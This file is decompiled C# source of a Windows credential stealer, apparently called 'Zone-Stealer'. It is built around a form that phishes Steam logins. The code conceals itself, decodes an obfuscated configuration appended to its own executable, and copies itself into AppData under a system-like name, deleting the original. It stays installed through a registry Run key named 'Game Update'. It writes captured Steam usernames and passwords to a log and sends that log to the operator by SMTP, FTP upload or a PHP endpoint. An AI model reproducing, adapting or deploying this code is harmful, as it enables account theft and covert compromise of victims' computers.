using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Stealer_Php.My;

namespace Stealer_Php;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer vTgXoHr4MOcH29JprR3OHaNxvAEGWZbHaHxa5DAEGWZbHaHxa5DAu6zIW4X4oZhA;

	private const string p30yLgM5P6Sm3p30yLgM5P6SmANYpKtUtI8j0RATs9Ov3uIZInKATs9Ov3uIZIn0 = "m8KAy1n5Sp92BQd94Jp8JXo5Yg9zcowIGOdzggpzNydFDZQD5Pc9QZxWq9nD4jCnl5JJWuPD4NeO4WFYURvmk0Xo5Yg95Qd94Jp8JAy1n5SpD4jCnl5JJWuPD4NeO4WFYURvmk";

	private const string hLhl1U05ltMy4dhKRV3W6pUrGAdhKRV3W6pUrGAc8X9craJe2iXAgVVqTTPJ7eXA = "yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf";

	private string gVVqTTPJ7eXo5UxACQFq6KEwTAOIeGxTx7koBMAOIeGxTx7koBMAom8d7F3KvPc0;

	private string t5QINqTKfyXJ6t5QINqTKfyXJA6aJ1jfe7Ta5aABXxjZET8J8rrABXxjZET8J8rA;

	private string wNU3i1QLX7SW7sKs7qFxLuKnPAsKs7qFxLuKnPAKBdVF168rJn2AP7j94eP9UVS0;

	private string P7j94eP9UVSL8kLnXoRhM5UrLAgwZbf0WMW2GtAgwZbf0WMW2GtAZPwwbRl9ifXA;

	private string dlO0l0uBsEcT9dlO0l0uBsEcTAXDtMLpBNhoB5ASZ62BPAN4OwOASZ62BPAN4Ow0;

	private string m0kOuDkBHzX1BqMHUmPaChaiwAqMHUmPaChaiwA3paoVDhOs9rbA79SWforOikAA;

	private string string_0;

	private string MOlLrCdPr4hz0MOlLrCdPr4hz0nGGhOzeEu3GeAiCuNYboEXFxYAiCuNYboEXFxA;

	private string W3R5ZOHR2EcB1aAvQOb6RSRdU0aAvQOb6RSRdUAZVa7rOqFfPw6AVomDxygFvc40;

	private string VomDxygFvc402jIkZ4nbSkbig0QdcFSNlS18RbAQdcFSNlS18RbA05tbf9KGElAA;

	private string string_1;

	private string EjnRBZYHZ4hj4J1E608iHDgYA0J1E608iHDgYAApXdTlaOUPGxGAlTOYc8DUoq9A;

	private string lTOYc8DUoq9Z5TKTsfxwIxSdC0XGYaoYnIaAW6AXGYaoYnIaAW6Ac72IHLUVAL40;

	public string SteamUser;

	public string SteamPass;

	public string EnablePhp;

	public string UrlAsPost;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)RiXPPIUGy1HS101o5FtIGcDwkA01o5FtIGcDwkArWgSyhx3OCdNAvTgXoHr4MOc0);
		gVVqTTPJ7eXo5UxACQFq6KEwTAOIeGxTx7koBMAOIeGxTx7koBMAom8d7F3KvPc0 = null;
		t5QINqTKfyXJ6t5QINqTKfyXJA6aJ1jfe7Ta5aABXxjZET8J8rrABXxjZET8J8rA = "";
		wNU3i1QLX7SW7sKs7qFxLuKnPAsKs7qFxLuKnPAKBdVF168rJn2AP7j94eP9UVS0 = "";
		P7j94eP9UVSL8kLnXoRhM5UrLAgwZbf0WMW2GtAgwZbf0WMW2GtAZPwwbRl9ifXA = "";
		dlO0l0uBsEcT9dlO0l0uBsEcTAXDtMLpBNhoB5ASZ62BPAN4OwOASZ62BPAN4Ow0 = "";
		m0kOuDkBHzX1BqMHUmPaChaiwAqMHUmPaChaiwA3paoVDhOs9rbA79SWforOikAA = "";
		string_0 = "";
		MOlLrCdPr4hz0MOlLrCdPr4hz0nGGhOzeEu3GeAiCuNYboEXFxYAiCuNYboEXFxA = "False";
		W3R5ZOHR2EcB1aAvQOb6RSRdU0aAvQOb6RSRdUAZVa7rOqFfPw6AVomDxygFvc40 = "False";
		VomDxygFvc402jIkZ4nbSkbig0QdcFSNlS18RbAQdcFSNlS18RbA05tbf9KGElAA = "False";
		string_1 = "False";
		EjnRBZYHZ4hj4J1E608iHDgYA0J1E608iHDgYAApXdTlaOUPGxGAlTOYc8DUoq9A = "False";
		lTOYc8DUoq9Z5TKTsfxwIxSdC0XGYaoYnIaAW6AXGYaoYnIaAW6Ac72IHLUVAL40 = "";
		SteamUser = "";
		SteamPass = "";
		EnablePhp = "False";
		UrlAsPost = "";
		aRqfjWoFBsME0aRqfjWoFBsMEAftMzYIT2NURsAjEy3hWd3n2iBAjEy3hWd3n2iA();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && vTgXoHr4MOcH29JprR3OHaNxvAEGWZbHaHxa5DAEGWZbHaHxa5DAu6zIW4X4oZhA != null)
			{
				vTgXoHr4MOcH29JprR3OHaNxvAEGWZbHaHxa5DAEGWZbHaHxa5DAu6zIW4X4oZhA.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void aRqfjWoFBsME0aRqfjWoFBsMEAftMzYIT2NURsAjEy3hWd3n2iBAjEy3hWd3n2iA()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(99, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	private void RiXPPIUGy1HS101o5FtIGcDwkA01o5FtIGcDwkArWgSyhx3OCdNAvTgXoHr4MOc0(object sender, EventArgs e)
	{
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0203: Unknown result type (might be due to invalid IL or missing references)
		//IL_0218: Unknown result type (might be due to invalid IL or missing references)
		//IL_022d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_0274: Unknown result type (might be due to invalid IL or missing references)
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0427: Unknown result type (might be due to invalid IL or missing references)
		string text = File.ReadAllText(Application.get_ExecutablePath());
		string[] array = Strings.Split(text, "m8KAy1n5Sp92BQd94Jp8JXo5Yg9zcowIGOdzggpzNydFDZQD5Pc9QZxWq9nD4jCnl5JJWuPD4NeO4WFYURvmk0Xo5Yg95Qd94Jp8JAy1n5SpD4jCnl5JJWuPD4NeO4WFYURvmk", -1, (CompareMethod)0);
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		try
		{
			VomDxygFvc402jIkZ4nbSkbig0QdcFSNlS18RbAQdcFSNlS18RbA05tbf9KGElAA = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[6]);
			wNU3i1QLX7SW7sKs7qFxLuKnPAsKs7qFxLuKnPAKBdVF168rJn2AP7j94eP9UVS0 = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[7]);
			P7j94eP9UVSL8kLnXoRhM5UrLAgwZbf0WMW2GtAgwZbf0WMW2GtAZPwwbRl9ifXA = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[8]);
			t5QINqTKfyXJ6t5QINqTKfyXJA6aJ1jfe7Ta5aABXxjZET8J8rrABXxjZET8J8rA = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[9]);
			string_1 = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[10]);
			string_0 = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[11]);
			dlO0l0uBsEcT9dlO0l0uBsEcTAXDtMLpBNhoB5ASZ62BPAN4OwOASZ62BPAN4Ow0 = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[12]);
			m0kOuDkBHzX1BqMHUmPaChaiwAqMHUmPaChaiwA3paoVDhOs9rbA79SWforOikAA = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[13]);
			EnablePhp = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[14]);
			UrlAsPost = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[15]);
			MOlLrCdPr4hz0MOlLrCdPr4hz0nGGhOzeEu3GeAiCuNYboEXFxYAiCuNYboEXFxA = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[16]);
			W3R5ZOHR2EcB1aAvQOb6RSRdU0aAvQOb6RSRdUAZVa7rOqFfPw6AVomDxygFvc40 = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[17]);
			EjnRBZYHZ4hj4J1E608iHDgYA0J1E608iHDgYAApXdTlaOUPGxGAlTOYc8DUoq9A = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[18]);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[1]), "True", false) == 0 && Operators.CompareString(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WUDFHost.exe", false) != 0)
		{
			MessageBoxButtons val = (MessageBoxButtons)0;
			MessageBoxIcon val2 = (MessageBoxIcon)64;
			string text2 = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[2]);
			if (Operators.CompareString(text2, Conversions.ToString(1), false) == 0)
			{
				val2 = (MessageBoxIcon)32;
			}
			else if (Operators.CompareString(text2, Conversions.ToString(2), false) == 0)
			{
				val2 = (MessageBoxIcon)48;
			}
			else if (Operators.CompareString(text2, Conversions.ToString(3), false) == 0)
			{
				val2 = (MessageBoxIcon)16;
			}
			string text3 = XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[3]);
			if (Operators.CompareString(text3, Conversions.ToString(0), false) == 0)
			{
				val = (MessageBoxButtons)4;
			}
			else if (Operators.CompareString(text3, Conversions.ToString(1), false) == 0)
			{
				val = (MessageBoxButtons)3;
			}
			else if (Operators.CompareString(text3, Conversions.ToString(3), false) == 0)
			{
				val = (MessageBoxButtons)1;
			}
			else if (Operators.CompareString(text3, Conversions.ToString(4), false) == 0)
			{
				val = (MessageBoxButtons)5;
			}
			else if (Operators.CompareString(text3, Conversions.ToString(5), false) == 0)
			{
				val = (MessageBoxButtons)2;
			}
			MessageBox.Show(XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[4]), XORDecryption("yth8tnbTaRjJOa6JYniCRZKNefyizzcowIGONydFEvaD5IuXmRYfcowIGONydFEvaD5IuXmRYf", array[5]), val, val2);
		}
		if (Operators.CompareString(MOlLrCdPr4hz0MOlLrCdPr4hz0nGGhOzeEu3GeAiCuNYboEXFxYAiCuNYboEXFxA, "True", false) == 0)
		{
			if (Operators.CompareString(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WUDFHost.exe", false) != 0)
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WUDFHost.exe"))
				{
					try
					{
						File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WUDFHost.exe");
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				if (File.Exists(Path.GetTempPath() + "melt.txt"))
				{
					try
					{
						File.Delete(Path.GetTempPath() + "melt.txt");
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WUDFHost.exe");
					File.WriteAllText(Path.GetTempPath() + "melt.txt", Application.get_ExecutablePath());
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WUDFHost.exe");
					ProjectData.EndApp();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			else if (File.Exists(Path.GetTempPath() + "melt.txt"))
			{
				try
				{
					File.Delete(File.ReadAllText(Path.GetTempPath() + "melt.txt"));
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
		}
		if (Operators.CompareString(W3R5ZOHR2EcB1aAvQOb6RSRdU0aAvQOb6RSRdUAZVa7rOqFfPw6AVomDxygFvc40, "True", false) == 0)
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Game Update", (object)Application.get_ExecutablePath(), RegistryValueKind.String);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(EjnRBZYHZ4hj4J1E608iHDgYA0J1E608iHDgYAApXdTlaOUPGxGAlTOYc8DUoq9A, "True", false) == 0)
		{
			((Form)MyProject.Forms.Steam).ShowDialog();
			Application.DoEvents();
		}
		A.GT();
		File.WriteAllText(Path.GetTempPath() + ((ServerComputer)MyProject.Computer).get_Name() + ".log", A.GT() + "Application: Steam\r\nUsername: " + SteamUser + "\r\nPassword: " + SteamPass);
		if (Operators.CompareString(VomDxygFvc402jIkZ4nbSkbig0QdcFSNlS18RbAQdcFSNlS18RbA05tbf9KGElAA, "True", false) == 0)
		{
			Send(t5QINqTKfyXJ6t5QINqTKfyXJA6aJ1jfe7Ta5aABXxjZET8J8rrABXxjZET8J8rA, wNU3i1QLX7SW7sKs7qFxLuKnPAsKs7qFxLuKnPAKBdVF168rJn2AP7j94eP9UVS0, P7j94eP9UVSL8kLnXoRhM5UrLAgwZbf0WMW2GtAgwZbf0WMW2GtAZPwwbRl9ifXA);
		}
		if (Operators.CompareString(string_1, "True", false) == 0)
		{
			UploadingLog(dlO0l0uBsEcT9dlO0l0uBsEcTAXDtMLpBNhoB5ASZ62BPAN4OwOASZ62BPAN4Ow0, m0kOuDkBHzX1BqMHUmPaChaiwAqMHUmPaChaiwA3paoVDhOs9rbA79SWforOikAA, "Ftp://" + string_0 + "/" + ((ServerComputer)MyProject.Computer).get_Name() + ".txt");
		}
		Application.Exit();
	}

	public string XORDecryption(string CodeKey, string DataIn)
	{
		string text = "";
		checked
		{
			long num = (long)Math.Round((double)Strings.Len(DataIn) / 2.0);
			for (long num2 = 1L; num2 <= num; num2++)
			{
				int num3 = (int)Math.Round(Conversion.Val("&H" + Strings.Mid(DataIn, (int)(2L * num2 - 1L), 2)));
				int num4 = Strings.Asc(Strings.Mid(CodeKey, (int)(unchecked(num2 % Strings.Len(CodeKey)) + 1L), 1));
				text += Conversions.ToString(Strings.Chr(num3 ^ num4));
			}
			return text;
		}
	}

	public void UploadingLog(string User, string Password, string FTP)
	{
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(FTP);
			ftpWebRequest.Credentials = new NetworkCredential(User, Password);
			ftpWebRequest.Method = "STOR";
			byte[] array = File.ReadAllBytes(Path.GetTempPath() + ((ServerComputer)MyProject.Computer).get_Name() + ".log");
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			requestStream.Dispose();
			ClearLog();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void ClearLog()
	{
		try
		{
			File.Delete(Path.GetTempPath() + "Send.log");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Send(string SMTP, string Destinataire, string MotDePasse)
	{
		try
		{
			string body = File.ReadAllText(Path.GetTempPath() + ((ServerComputer)MyProject.Computer).get_Name() + ".log");
			SmtpClient smtpClient = new SmtpClient();
			MailMessage mailMessage = new MailMessage();
			smtpClient.Credentials = new NetworkCredential(Destinataire, MotDePasse);
			smtpClient.Port = 587;
			smtpClient.Host = SMTP;
			smtpClient.EnableSsl = true;
			mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(Destinataire);
			mailMessage.To.Add(Destinataire);
			mailMessage.Subject = "Zone-Stealer [" + ((ServerComputer)MyProject.Computer).get_Name() + "|" + DateAndTime.get_TimeOfDay().ToString() + "]";
			mailMessage.Body = body;
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void SendPhp(int id, string UrlLogin, string Login, string MDP)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			if (Operators.CompareString(EnablePhp, "False", false) != 0)
			{
				WebBrowser val = new WebBrowser();
				val.set_ScriptErrorsSuppressed(true);
				string text = UrlAsPost + "?action=add&a=" + Conversions.ToString(id) + "&c=" + ((ServerComputer)MyProject.Computer).get_Name() + "&u=" + UrlLogin + "&l=" + Login + "&p=" + MDP;
				val.Navigate(text);
				Thread.Sleep(400);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
